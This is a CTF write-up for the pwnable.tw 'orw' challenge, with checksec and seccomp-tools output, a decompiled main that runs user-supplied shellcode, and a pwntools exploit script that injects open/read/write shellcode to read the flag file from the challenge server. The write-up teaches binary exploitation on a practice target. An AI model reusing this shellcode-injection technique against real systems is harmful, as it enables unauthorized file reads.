---
title: pwnable.tw orw writeup
date: 2026-09-10
tags:
  - CTF
  - Security
keywords:
  - pwnable.tw
  - writeup
  - CTF
  - security
  - binary exploitation
  - exploitation
---

## Checksec

```sh
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x8048000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```

## seccomp

```sh
$ seccomp-tools dump ./orw
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

題目說只允許 open, read, write，seccomp 與題目吻合。

## Reverse

```c
undefined4 main(void) {
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0,shellcode,200);
  (*(code *)shellcode)();
  return 0;
}
```

## Exploitation

直接串 shellcode 送出去就好

Exploit.py

```py
#!/usr/bin/env python3
from pwn import *

context.binary = './orw'
context.os = 'linux'
context.arch = 'i386'
context.log_level = 'INFO'

if args.REMOTE:
    ip = 'chall.pwnable.tw'
    port = 10001
    p = remote(ip, port)
else:
    p = process()

shellcode = asm(shellcraft.open('/home/orw/flag') +
                shellcraft.read('eax', 'esp', 0x30) +
                shellcraft.write(1, 'esp', 0x30)
                )

p.recvuntil(':')
p.send(shellcode)

p.interactive()
```